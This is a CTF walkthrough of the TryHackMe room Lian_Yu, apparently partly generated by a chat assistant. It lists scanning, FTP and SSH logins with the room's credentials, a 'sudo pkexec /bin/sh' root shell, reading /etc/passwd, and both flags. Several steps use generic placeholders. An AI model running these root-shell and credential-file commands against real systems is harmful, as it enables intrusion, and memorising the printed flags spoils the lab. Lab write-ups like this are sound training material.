# Lian_Yu TryHackMe Walkthrough

## Description

| | |
|---|---|
| **Room Name** | Lian_Yu |
| **Platform** | TryHackMe |
| **Difficulty** | Easy / Medium |
| **Category** | Capture The Flag (CTF) |
| **Techniques Used** | Network Scanning, Web Enumeration, Base58 Decoding, FTP Exploitation, Steganography, SSH Access, Privilege Escalation |
| **Tools Used** | nmap, gobuster, ftp, steghide, strings, binwalk, ssh, pkexec |

### Overview

The Lian_Yu room on TryHackMe is a Capture The Flag (CTF) challenge themed around the Green Arrow storyline, specifically referencing the island where Oliver Queen was stranded. This room tests fundamental penetration testing skills including reconnaissance, web enumeration, credential extraction, steganography, and privilege escalation.

Here's the complete Lian_Yu TryHackMe walkthrough with all steps in Markdown code format:

 Lian_Yu TryHackMe Walkthrough

---

 Step 1: Start Machine & VPN

1. Go to TryHackMe Lian_Yu room and click "Start Machine"
2. Wait 2-3 minutes for the machine to boot
3. Verify VPN connection by running: `ip a show tun0`
4. Confirm you see an IP address in the 10.x.x.x range
5. Note the target machine IP (e.g., 10.49.151.173)

**Screenshot:**

<img width="786" height="197" alt="Screenshot 2026-04-21 010637" src="https://github.com/user-attachments/assets/a02c5790-80ff-4cff-b24c-22d7047d817f" />


---

 Step 2: Nmap Scan

Run comprehensive Nmap scan to discover open ports and services:

```bash
nmap -sC -sV -Pn 10.49.151.173
```

**Flag explanations:**
- `-sC`: Runs default security scripts for enumeration
- `-sV`: Detects service/version info on open ports
- `-Pn`: Skips host discovery (useful when ICMP is blocked)

**Expected findings:** HTTP (port 80) and FTP (port 21) services.

**Screenshot:**

<img width="900" height="518" alt="image" src="https://github.com/user-attachments/assets/42b76674-7b66-4594-ac9c-1945bf1e6f5f" />


---

## Step 3: Directory Enumeration

Use Gobuster to find hidden web directories:

```bash
gobuster dir -u http://10.49.151.173 -w /usr/share/wordlists/dirb/common.txt
```

**What this does:** Brute-forces common directory names on the webserver.

**Key finding:** Discovers `/2100` directory.

Open in browser: `http://10.49.151.173/2100`

**Screenshots:**

<img width="900" height="556" alt="image" src="https://github.com/user-attachments/assets/c1c97e5a-252f-4b6c-b39a-eae7d68cb2f3" />


<img width="900" height="499" alt="image" src="https://github.com/user-attachments/assets/e01f4150-ea7e-4e44-9340-d550dabc469a" />


---

## Step 4: Find Ticket

Inside `/2100` directory, locate `green_arrow.ticket` file.

**Action:**
1. Download or view the file
2. The content is Base58 encoded
3. Decode using online Base58 decoder or command line:

```bash
echo "encoded_string" | base58 -d
```

**Decoded credential:**
- FTP Username: `vigilante`
- FTP Password: `!#th3h00d`

**Screenshot:**

<img width="845" height="221" alt="image" src="https://github.com/user-attachments/assets/0b792752-84ca-4ccb-96c1-77575ef81a23" />


---

## Step 5: FTP Access

Connect to FTP server using discovered credentials:

```bash
ftp 10.49.151.173
```

**Login:**
- Username: `vigilante`
- Password: `!#th3h00d`

**Commands to run inside FTP:**
```bash
ls                    # List all files
binary                # Set binary transfer mode
get file1.jpg         # Download each image
get file2.png
get file3.jpg
bye                   # Exit FTP
```

**Download all image files** for steganography analysis.

**Screenshots:**

<img width="804" height="690" alt="image" src="https://github.com/user-attachments/assets/a2358ab5-c40e-4de3-9e68-5fdcd9860f1f" />


<img width="683" height="1044" alt="image" src="https://github.com/user-attachments/assets/42bc6c45-e5ba-491e-9c56-b448dd4cf93d" />


---

## Step 6: Extract Credentials

Extract hidden data from downloaded images using steganography tools:

**Method 1 - steghide:**
```bash
steghide extract -sf image.jpg
# Press Enter when prompted for passphrase (none by default)
```

**Method 2 - strings:**
```bash
strings image.jpg | grep -i password
```

**Method 3 - binwalk:**
```bash
binwalk -e image.jpg
```

**Extracted SSH credential:**
- Username: `slade`
- SSH Password: `M3tahuman`

**Screenshots:**

<img width="381" height="121" alt="image" src="https://github.com/user-attachments/assets/48ad3708-6077-44d8-9a51-5789fd501ab2" />


<img width="773" height="331" alt="image" src="https://github.com/user-attachments/assets/cd232990-6e77-4634-ae4b-961ed0aa294a" />


---

## Step 7: SSH Login

Connect via SSH to gain shell access:

```bash
ssh slade@10.49.151.173
```

When prompted:
- Password: `M3tahuman`

**After successful login:**
```bash
whoami                 # Confirm user is slade
pwd                    # Check current directory
ls -la                 # List all files
cat user.txt           # Read the user flag
```

**User Flag:**
`THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

**Screenshots:**

<img width="900" height="653" alt="image" src="https://github.com/user-attachments/assets/3f8d07e8-ff0d-4bf0-94c4-e6cbc65a50ef" />


<img width="458" height="158" alt="image" src="https://github.com/user-attachments/assets/118044a0-fb38-465d-ab58-6f06ab0273dc" />


---

## Step 8: Privilege Escalation

Escalate from `slade` to root using `pkexec` vulnerability:

**Step 1 - Check sudo permissions:**
```bash
sudo -l
```
This shows what commands the user can run as root.

**Step 2 - Verify pkexec is available:**
```bash
which pkexec
```

**Step 3 - Exploit pkexec:**
```bash
sudo pkexec /bin/sh
```

**What this does:** `pkexec` allows authorized users to execute commands as another user (typically root). When combined with sudo, it spawns a root shell.

**Success indicator:** Prompt changes from `$` to `#` (root shell).

**Verify root access:**
```bash
whoami                 # Should output "root"
id                     # Show user privileges
```

**Screenshot:**

<img width="900" height="142" alt="image" src="https://github.com/user-attachments/assets/613c2b45-8287-47e0-9fde-502d9d0e2e86" />


---

## Step 9: Root Flag

Navigate to root directory and retrieve final flag:

```bash
cd /root               # Change to root's home directory
ls -la                 # List all files including hidden ones
cat root.txt           # Display the root flag
```

**Root Flag:**
`THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

**Optional - Proof of completion:**
```bash
cat /etc/passwd
```

**Screenshot:**

<img width="900" height="324" alt="image" src="https://github.com/user-attachments/assets/16372267-08b3-4370-8de3-36221330aeb4" />


---

## Summary

| Step | Action | Credentials/Flags Found |
|------|--------|------------------------|
| 1 | VPN & Machine Setup | Target IP: 10.49.151.173 |
| 2 | Nmap Scan | Port 80 (HTTP), Port 21 (FTP) |
| 3 | Directory Enumeration | /2100 directory |
| 4 | Find Ticket | vigilante / !#th3h00d |
| 5 | FTP Access | 3 image files downloaded |
| 6 | Extract Credentials | slade / M3tahuman |
| 7 | SSH Login | User flag captured |
| 8 | Privilege Escalation | Root shell obtained |
| 9 | Root Flag | Final root flag captured |

---

## Tools Used

- `nmap` - Network scanning
- `gobuster` - Directory enumeration
- `base58` - Decoding ticket
- `ftp` - File transfer
- `steghide` - Steganography extraction
- `strings` - String extraction
- `binwalk` - Embedded file detection
- `ssh` - Remote shell access
- `pkexec` - Privilege escalation

```

This Markdown code includes all 9 steps with their instructions, commands, screenshots, and a summary table at the end. You can copy this directly into a `.md` file and it will render properly on any Markdown viewer like GitHub, GitLab, or VS Code.
